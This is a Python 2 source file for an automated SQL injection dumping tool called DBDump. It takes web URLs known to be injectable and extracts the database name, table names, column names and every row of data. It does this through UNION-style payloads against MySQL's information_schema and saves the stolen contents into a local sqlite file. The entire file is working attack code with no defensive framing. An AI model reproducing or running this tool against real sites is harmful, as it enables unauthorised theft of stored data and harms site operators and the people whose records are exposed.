import os
import sqlite3
import urllib2
import urlparse
import time
import BeautifulSoup 

from termcolor import colored, cprint

from functions import *
func = functions()

class DBDump:

	def __init__(self):
		self.tbl_names = []
		self.col_names = []
		self.tbl_overview = {}
		self.start_tag 	= "<tag>"
		self.finish_tag	= "<\/tag>"
		self.col_length = 20
		self.db_file = "sqli.db"
		self.dbname = ""
		self.varsql = ""
		self.conn = self.createDB(self.db_file)

	def start(self, mysqlvulns):
		for sqlurl, sqlnum in iter(mysqlvulns.iteritems()):
			self.varsql = self.testVar(sqlurl, sqlnum)
			self.dbname = self.getDBName()
			print colored("[+] [{1}] DataBase: {0}".format(self.dbname, func.showTime()), "white", "on_blue")
			tblnames = self.getTableNames(self.varsql, self.dbname)
			print colored("[+] [{1}] Tables: {0}".format(tblnames, func.showTime()), "white", "on_blue")
			for tblname in tblnames:
				if tblname <> "log":
					strcolnames = ""
					colnames = self.getColumnNames(self.varsql, self.dbname, tblname)
					for colname in colnames:
						strcolnames += colname + "||"
					self.tbl_overview[tblname] = strcolnames
			self.saveStructure(self.varsql, self.dbname, self.tbl_overview)
			self.dumpData(self.varsql, self.dbname, self.tbl_overview)
			self.conn.close()

			break
		return False

	def display(self):
		self.printStructure(self.varsql, self.dbname, self.tbl_overview)

	def testVar(self, sqlurl, sqlnum):
		for x in range(1, sqlnum + 1):
			newurl = self.replacenth(sqlurl, "NULL", "'[XX]'", x)
			content = urllib2.urlopen(newurl).read()
			if "[XX]" in content:
				return newurl

	def findnth(self, source, target, n):
	    num = 0
	    start = -1
	    while num < n:
	        start = source.find(target, start+1)
	        if start == -1: return -1
	        num += 1
	    return start

	def replacenth(self, source, old, new, n):
		p = self.findnth(source, old, n)
		if n == -1: return source
		return source[:p] + new + source[p+len(old):]

	def sqlRequest(self, httpsql):
		content = urllib2.urlopen(httpsql).read()
		for item in content.split("</tag>"):
			if "" + self.start_tag + "" in item:
				return item [ item.find("" + self.start_tag + "")+len("" + self.start_tag + "") : ]

	def getDBName(self):
		httpsql = self.varsql.replace("'[XX]'", "concat('" + self.start_tag + "',database(),'" + self.finish_tag + "')");
		return self.sqlRequest(httpsql)

	def getNumTables(self):
	    httpsql = self.varsql.replace("'[XX]'", "concat('" + self.start_tag + "',count(*),'" + self.finish_tag + "')");
	    httpsql += "%20FROM%20information_schema.tables%20WHERE%20table_schema='" + self.dbname + "'"
	    return self.sqlRequest(httpsql)

	def getTableNames(self, varsql, dbname):
		tbl_names = []
		httpsql = varsql.replace("'[XX]'", "concat('" + self.start_tag + "',table_name,'" + self.finish_tag + "')");
		httpsql += "%20FROM%20information_schema.tables%20WHERE%20table_schema='" + dbname + "'"
		content = urllib2.urlopen(httpsql).read()
		for item in content.split("</tag>"):
			if "" + self.start_tag + "" in item: 
				tblname = item [ item.find("" + self.start_tag + "")+len("" + self.start_tag + "") : ]
				tbl_names.append(tblname)
		return tbl_names

	def getColumnNames(self, varsql, dbname, tblname):
		col_names = []
		httpsql = varsql.replace("'[XX]'", "concat('" + self.start_tag + "',concat(column_name,'|',column_type),'" + self.finish_tag + "')");
		httpsql += "%20FROM%20information_schema.columns%20WHERE%20table_schema='" + dbname + "'%20and%20table_name='" + tblname + "'"
		content = urllib2.urlopen(httpsql).read()
		for item in content.split("</tag>"):
			if "" + self.start_tag + "" in item: 
				colname = item [ item.find("" + self.start_tag + "")+len("" + self.start_tag + "") : ]
				col_names.append(colname)
		return col_names

	def printStructure(self, varsql, dbname, tbl_overview):
		print " Database: {0}".format(dbname)
		for tblname, strcolnames in iter(tbl_overview.iteritems()):
			print ""
			start_create = "CREATE TABLE " + tblname + " ("
			createsql = start_create
			numrows = self.getNumRows(varsql, tblname)
			print " +" + ("-" * (self.col_length * 2)) + "+"
			print " | Table: " + tblname + "(" + numrows + ")" + (" " * ((self.col_length * 2) - len(tblname) - 10 - len(numrows))) + "|"
			print " +" + ("-" * (self.col_length * 2)) + "+"
			columns = strcolnames.split("||")
			for column in columns:
				split = column.split("|")
				if len(split[0]) > 0:
					print " | " + split[0] + (" " * (self.col_length - len(split[0]) - 1)) + "| " + split[1] + (" " * (self.col_length - len(split[1]) - 2)) + "|"
					if createsql <> start_create:
						createsql += ","
					createsql += split[0] + " TEXT"
			print " +" + ("-" * (self.col_length * 2)) + "+"
			createsql += ")"
			self.conn.execute(createsql)

	def saveStructure(self, varsql, dbname, tbl_overview):
		for tblname, strcolnames in iter(tbl_overview.iteritems()):
			start_create = "CREATE TABLE " + tblname + " ("
			createsql = start_create
			numrows = self.getNumRows(varsql, tblname)
			columns = strcolnames.split("||")
			for column in columns:
				split = column.split("|")
				if len(split[0]) > 0:
					if createsql <> start_create:
						createsql += ","
					createsql += split[0] + " TEXT"
			createsql += ")"
			self.conn.execute(createsql)

	def getNumRows(self, varsql, tblname):
		httpsql = varsql.replace("'[XX]'", "concat('" + self.start_tag + "',count(*),'" + self.finish_tag + "')");
		httpsql += "%20FROM%20" + tblname
		return self.sqlRequest(httpsql)

	def createDB(self, db_file):
		if os.path.isfile(db_file):
			os.remove(db_file)
		return sqlite3.connect(db_file)

	def escape_html(self, html):
		return html.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')

	def dumpData(self, varsql, dbname, tbl_overview):
		cursor = self.conn.cursor()
		for tblname, strcolnames in iter(tbl_overview.iteritems()):
			print colored("[+] [{1}] Dumping Table: {0}".format(tblname, func.showTime()), "cyan")
			columns = strcolnames.split("||")
			start_con = "concat('" + self.start_tag + "',"
			concat = start_con
			for column in columns:
				rows = column.split("|")
				row = rows[0]
				if concat != start_con and len(row) > 0:
					concat += ",'|',"
				concat += row
			concat += ",'" + self.finish_tag + "')"
			numrows = self.getNumRows(varsql, tblname)
			httpsql = varsql.replace("'[XX]'", concat);
			httpsql += "%20FROM%20" + tblname
			for x in range(1, (int(numrows)+1)):
				rangesql = httpsql + "%20LIMIT%20" + str(x) + ",1"
				content = urllib2.urlopen(rangesql).read()
				for item in content.split("</tag>"):
					if "" + self.start_tag + "" in item: 
						retval = item [ item.find("" + self.start_tag + "")+len("" + self.start_tag + "") : ]
						items = retval.split("|")
						addstartsql = "INSERT INTO " + tblname + " VALUES ("
						addsql = addstartsql
						for data in items:
							if addstartsql <> addsql:
								addsql += ","
							addsql += "'" + self.escape_html(data) + "'"
						addsql += ");"
						#print addsql
						cursor.execute(addsql)
		self.conn.commit()